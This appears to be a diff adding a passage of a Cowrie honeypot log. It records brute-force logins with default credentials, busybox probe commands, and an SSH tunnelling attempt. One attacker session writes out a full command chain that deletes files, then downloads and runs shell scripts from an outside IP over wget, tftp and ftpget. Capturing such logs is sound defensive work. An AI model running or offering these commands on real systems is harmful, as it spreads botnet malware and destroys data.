@@ -1808,3 +1808,125 @@
 2017-06-07T04:08:58+0000 [CowrieTelnetTransport,22649,192.254.68.106] login attempt: 5
 2017-06-07T04:08:58+0000 [CowrieTelnetTransport,22649,192.254.68.106] login return, expect: [CONNECT google.com:80 HTTP/1.1/Host: google.com:80]
 2017-06-07T04:09:00+0000 [CowrieTelnetTransport,22649,192.254.68.106] login attempt [CONNECT google.com:80 HTTP/1.1/Host: google.com:80] succeeded
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22649,192.254.68.106] Opening TTY Log: log/tty/20170607-040902-None-22649i.log
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22649,192.254.68.106] Warning: state changed and new state returned
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22649,192.254.68.106] CMD: 
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] CMD: system
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command not found: system
+2017-06-07T04:09:02+0000 [HoneyPotSSHTransport,8617,212.129.23.96] Remote SSH version: SSH-2.0-5.17 FlowSsh: my-app 1.0
+2017-06-07T04:09:02+0000 [HoneyPotSSHTransport,8617,212.129.23.96] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-07T04:09:02+0000 [HoneyPotSSHTransport,8617,212.129.23.96] outgoing: 'aes256-ctr' 'hmac-sha1' 'none'
+2017-06-07T04:09:02+0000 [HoneyPotSSHTransport,8617,212.129.23.96] incoming: 'aes256-ctr' 'hmac-sha1' 'none'
+2017-06-07T04:09:02+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 43.249.205.21:48564 (10.8.41.81:2223) [session: TT22650]
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22649,192.254.68.106] Closing TTY Log: log/tty/20170607-040902-None-22649i.log after 0 seconds
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22649,192.254.68.106] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22649,192.254.68.106] Connection lost after 3 seconds
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] CMD: shell
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command not found: shell
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] CMD: sh
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: sh 
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] CMD:  /bin/busybox wget; /bin/busybox 81c46036wget; /bin/busybox echo -ne '\x0181c46036\x7f'; /bin/busybox printf '\00281c46036\177'; /bin/echo -ne '\x0381c46036\x7f'; /usr/bin/printf '\00481c46036\177'; /bin/busybox tftp; /bin/busybox 81c46036tftp;
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: /bin/busybox wget
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: wget
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: /bin/busybox 81c46036wget
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: /bin/busybox echo -ne '\x0181c46036\x7f'
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: echo -ne '\x0181c46036\x7f'
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: /bin/busybox printf '\00281c46036\177'
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: /bin/echo -ne '\x0381c46036\x7f'
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command not found: /usr/bin/printf '\00481c46036\177'
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: /bin/busybox tftp
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: tftp
+2017-06-07T04:09:02+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: /bin/busybox 81c46036tftp
+2017-06-07T04:09:03+0000 [CowrieTelnetTransport,22646,81.215.183.61] CMD:  /bin/busybox dd if=/bin/busybox bs=22 count=1 || /bin/busybox cat /bin/busybox
+2017-06-07T04:09:03+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: /bin/busybox dd if=/bin/busybox bs=22 count=1
+2017-06-07T04:09:03+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: /bin/busybox cat /bin/busybox
+2017-06-07T04:09:03+0000 [CowrieTelnetTransport,22646,81.215.183.61] Command found: cat /bin/busybox
+2017-06-07T04:09:03+0000 [HoneyPotSSHTransport,8617,212.129.23.96] NEW KEYS
+2017-06-07T04:09:03+0000 [HoneyPotSSHTransport,8617,212.129.23.96] starting service 'ssh-userauth'
+2017-06-07T04:09:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8617,212.129.23.96] 'user' trying auth 'password'
+2017-06-07T04:09:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8617,212.129.23.96] login attempt: 313
+2017-06-07T04:09:04+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8617,212.129.23.96] login return, expect: [user/1234]
+2017-06-07T04:09:06+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8617,212.129.23.96] login attempt [user/1234] succeeded
+2017-06-07T04:09:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8617,212.129.23.96] 'user' authenticated with 'password'
+2017-06-07T04:09:07+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,8617,212.129.23.96] starting service 'ssh-connection'
+2017-06-07T04:09:07+0000 [HoneyPotSSHTransport,8617,212.129.23.96] Got remote error, code 11
+	reason: Disconnected on user's request.
+2017-06-07T04:09:07+0000 [HoneyPotSSHTransport,8617,212.129.23.96] avatar user logging out
+2017-06-07T04:09:07+0000 [HoneyPotSSHTransport,8617,212.129.23.96] connection lost
+2017-06-07T04:09:07+0000 [HoneyPotSSHTransport,8617,212.129.23.96] Connection lost after 9 seconds
+2017-06-07T04:09:08+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.165.29.62:39418 (10.8.41.81:2223) [session: TT22651]
+2017-06-07T04:09:10+0000 [CowrieTelnetTransport,22651,185.165.29.62] login attempt: 2
+2017-06-07T04:09:10+0000 [CowrieTelnetTransport,22651,185.165.29.62] login return, expect: [root/]
+2017-06-07T04:09:11+0000 [CowrieTelnetTransport,22651,185.165.29.62] login attempt [root/] succeeded
+2017-06-07T04:09:13+0000 [CowrieTelnetTransport,22651,185.165.29.62] Opening TTY Log: log/tty/20170607-040913-None-22651i.log
+2017-06-07T04:09:13+0000 [CowrieTelnetTransport,22651,185.165.29.62] Warning: state changed and new state returned
+2017-06-07T04:09:13+0000 [CowrieTelnetTransport,22651,185.165.29.62] CMD: sh
+2017-06-07T04:09:13+0000 [CowrieTelnetTransport,22651,185.165.29.62] Command found: sh 
+2017-06-07T04:09:13+0000 [CowrieTelnetTransport,22651,185.165.29.62] CMD: cd /tmp || cd /var/run || rm -f *; wget http://185.165.29.62/sc.sh; busybox wget http://185.165.29.62/sc.sh; sh sc.sh; tftp 185.165.29.62 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.165.29.62; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf sc.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-06-07T04:09:13+0000 [CowrieTelnetTransport,22651,185.165.29.62] Command found: cd /tmp
+2017-06-07T04:09:13+0000 [CowrieTelnetTransport,22651,185.165.29.62] Command found: cd /var/run
+2017-06-07T04:09:13+0000 [CowrieTelnetTransport,22651,185.165.29.62] Command found: rm -f /var/run/sshd.pid /var/run/sshd /var/run/crond.reboot /var/run/crond.pid /var/run/acpid.pid /var/run/acpid.socket /var/run/motd.dynamic /var/run/dhclient.eth0.pid /var/run/network /var/run/shm /var/run/mount /var/run/lock /var/run/sendsigs.omit.d /var/run/initctl /var/run/utmp /var/run/udev /var/run/initramfs
+2017-06-07T04:09:13+0000 [CowrieTelnetTransport,22651,185.165.29.62] Command found: wget http://185.165.29.62/sc.sh
+2017-06-07T04:09:13+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.29.62/sc.sh>
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Not storing duplicate content bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.29.62/sc.sh) with SHA-256 bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2 to dl/bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.29.62/sc.sh
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.29.62/sc.sh
+2017-06-07T04:09:13+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.29.62/sc.sh>
+2017-06-07T04:09:13+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.29.62/sc.sh>
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Not storing duplicate content bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.29.62/sc.sh) with SHA-256 bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2 to dl/bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Command found: sh /var/run/sc.sh
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.29.62 -c get tftp1.sh
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.29.62
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-06-07T04:09:13+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 ftp1.sh ftp1.sh
+2017-06-07T04:09:14+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://185.165.29.62/ftp1.sh) with SHA-256 f47ae12d78395307d836f2779669fd110be3ed57544a37e639060799bfae745d to dl/f47ae12d78395307d836f2779669fd110be3ed57544a37e639060799bfae745d
+2017-06-07T04:09:14+0000 [HTTPPageDownloader,client] Command found: sh /var/run/ftp1.sh
+2017-06-07T04:09:14+0000 [HTTPPageDownloader,client] Command found: rm -rf /var/run/sc.sh tftp1.sh tftp2.sh /var/run/ftp1.sh
+2017-06-07T04:09:14+0000 [HTTPPageDownloader,client] Command found: rm -rf /var/run/sshd /var/run/network /var/run/shm /var/run/mount /var/run/lock /var/run/sendsigs.omit.d /var/run/udev /var/run/initramfs
+2017-06-07T04:09:14+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.29.62/sc.sh>
+2017-06-07T04:09:17+0000 [CowrieTelnetTransport,22650,43.249.205.21] login attempt: 33
+2017-06-07T04:09:17+0000 [CowrieTelnetTransport,22650,43.249.205.21] login return, expect: [root/root]
+2017-06-07T04:09:19+0000 [CowrieTelnetTransport,22650,43.249.205.21] login attempt [admin/admin] failed
+2017-06-07T04:09:19+0000 [CowrieTelnetTransport,22650,43.249.205.21] Warning: state changed and new state returned
+2017-06-07T04:09:20+0000 [CowrieTelnetTransport,22650,43.249.205.21] login attempt: 34
+2017-06-07T04:09:20+0000 [CowrieTelnetTransport,22650,43.249.205.21] login return, expect: [root/root]
+2017-06-07T04:09:22+0000 [CowrieTelnetTransport,22650,43.249.205.21] login attempt [enable/shell] failed
+2017-06-07T04:09:22+0000 [CowrieTelnetTransport,22650,43.249.205.21] Warning: state changed and new state returned
+2017-06-07T04:09:22+0000 [HoneyPotSSHTransport,8353,91.230.47.82] avatar 1111 logging out
+2017-06-07T04:09:22+0000 [HoneyPotSSHTransport,8353,91.230.47.82] connection lost
+2017-06-07T04:09:22+0000 [HoneyPotSSHTransport,8353,91.230.47.82] Connection lost after 12681 seconds
+2017-06-07T04:09:23+0000 [CowrieTelnetTransport,22650,43.249.205.21] login attempt: 35
+2017-06-07T04:09:23+0000 [CowrieTelnetTransport,22650,43.249.205.21] login return, expect: [root/root]
+2017-06-07T04:09:25+0000 [CowrieTelnetTransport,22650,43.249.205.21] login attempt [sh//bin/busybox ECCHI] failed
+2017-06-07T04:09:25+0000 [CowrieTelnetTransport,22650,43.249.205.21] Warning: state changed and new state returned
+2017-06-07T04:09:25+0000 [CowrieTelnetTransport,22651,185.165.29.62] Not storing duplicate content bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-07T04:09:25+0000 [CowrieTelnetTransport,22651,185.165.29.62] Saved redir contents with SHA-256 bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2 to dl/bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-07T04:09:25+0000 [CowrieTelnetTransport,22651,185.165.29.62] Not storing duplicate content f47ae12d78395307d836f2779669fd110be3ed57544a37e639060799bfae745d
+2017-06-07T04:09:25+0000 [CowrieTelnetTransport,22651,185.165.29.62] Saved redir contents with SHA-256 f47ae12d78395307d836f2779669fd110be3ed57544a37e639060799bfae745d to dl/f47ae12d78395307d836f2779669fd110be3ed57544a37e639060799bfae745d
+2017-06-07T04:09:25+0000 [CowrieTelnetTransport,22651,185.165.29.62] Closing TTY Log: log/tty/20170607-040913-None-22651i.log after 12 seconds
+2017-06-07T04:09:25+0000 [CowrieTelnetTransport,22651,185.165.29.62] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-06-07T04:09:25+0000 [CowrieTelnetTransport,22651,185.165.29.62] Connection lost after 17 seconds
+2017-06-07T04:09:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 104.236.52.155:60332 (10.8.41.81:2222) [session: 90af552a]
+2017-06-07T04:09:26+0000 [HoneyPotSSHTransport,8618,104.236.52.155] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-06-07T04:09:26+0000 [HoneyPotSSHTransport,8618,104.236.52.155] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-07T04:09:26+0000 [HoneyPotSSHTransport,8618,104.236.52.155] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T04:09:26+0000 [HoneyPotSSHTransport,8618,104.236.52.155] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T04:09:26+0000 [HoneyPotSSHTransport,8349,91.230.47.81] avatar 1111 logging out
+2017-06-07T04:09:26+0000 [HoneyPotSSHTransport,8349,91.230.47.81] connection lost
+2017-06-07T04:09:26+0000 [HoneyPotSSHTransport,8349,91.230.47.81] Connection lost after 12800 seconds
+2017-06-07T04:09:32+0000 [HoneyPotSSHTransport,8618,104.236.52.155] NEW KEYS
+2017-06-07T04:09:32+0000 [HoneyPotSSHTransport,8618,104.236.52.155] starting service 'ssh-userauth'
+2017-06-07T04:09:32+0000 [HoneyPotSSHTransport,8618,104.236.52.155] connection lost
+2017-06-07T04:09:32+0000 [HoneyPotSSHTransport,8618,104.236.52.155] Connection lost after 5 seconds
+2017-06-07T04:09:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8595,91.195.103.196] got channel 'direct-tcpip' request
+2017-06-07T04:09:58+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,8595,91.195.103.196] direct-tcp connection request to 172.227.119.212:443 from localhost:5556
+2017-06-07T04:09:59+0000 [SSHChannel None (24) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8595,91.195.103.196] direct-tcp forward to 172.227.119.212:443 with data "\x16\x03\x03\x00\xb4\x01\x00\x00\xb0\x03\x03Y7|i\x19\xde\xc0f\x9a\xe7UU`\xb1\xf6\xf4}!\xa2\xa1V\xaf\xe9i\x96\xb8d\xb6\xae\xa3$\xf0\x00\x008\xc0(\xc0'\xc0\x14\xc0\x13\x00\x9f\x00\x9e\x009\x003\x00\x9d\x00\x9c\x00=\x00<\x005\x00/\xc0,\xc0+\xc0$\xc0#\xc0\n\xc0\t\x00j\x00@\x008\x002\x00\n\x00\x13\x00\x05\x00\x04\x01\x00\x00O\x00\x00\x00\x1a\x00\x18\x00\x00\x15mservices.navyfcu.org\x00\n\x00\x06\x00\x04\x00\x17\x00\x18\x00\x0b\x00\x02\x01\x00\x00\r\x00\x14\x00\x12\x06\x01\x06\x03\x04\x01\x05\x01\x02\x01\x04\x03\x05\x03\x02\x03\x02\x02\x00\x17\x00\x00\xff\x01\x00\x01\x00"
+2017-06-07T04:09:59+0000 [SSHChannel None (24) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8595,91.195.103.196] failed to connect: Connection refused
+2017-06-07T04:09:59+0000 [SSHChannel None (24) on SSHService 'ssh-connection' on HoneyPotSSHTransport,8595,91.195.103.196] sending close 24
